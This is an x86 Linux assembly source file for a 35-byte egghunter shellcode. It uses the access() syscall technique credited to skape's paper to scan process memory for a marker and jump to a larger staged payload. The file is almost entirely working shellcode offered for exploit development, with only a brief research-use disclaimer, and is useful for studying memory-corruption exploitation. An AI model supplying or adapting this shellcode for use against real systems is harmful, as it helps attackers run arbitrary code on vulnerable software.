; Title: Linux Egghunter Shellcode
; Author Liviu I. 
;
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE

; Uses the access() syscall explained in skape's paper:
; "Safely Searching Process Virtual Address Space"

; Shellcode egghunter
; Size: 35 bytes
; Pros: small, fast, egg does not have to be executable
; Cons: dimension, set DF in case of failure

global _start			

section .text
_start:
    xor edx,edx         ; Zero out EDX. Will hold the pointer to be validated
next_page:
    or dx,0xfff         ; Page allignment
next_addr:
    inc edx             ; Try next valid address in the current page
    lea ebx,[edx+0x4]   ; 1st arg to access() - address being validated
    push byte +0x21     ; access() system call number
    pop eax             
    int 0x80            ; Execute syscall 
    cmp al,0xf2         ; Compare with EFAULT
    jz short next_page  ; Jump to the next page
    mov eax,<EGG>       ; The EGG
    mov edi,edx         ; Prepare for scasd comparison
    scasd               ; Compare the dword at EAX with the dword in ES:EDI
    jnz short next_addr ; Not found - go to next address in the current page
    scasd               ;
    jnz short next_addr ; Not found - go to next address in the current page
    jmp edi             ; EDI will point past the egg!
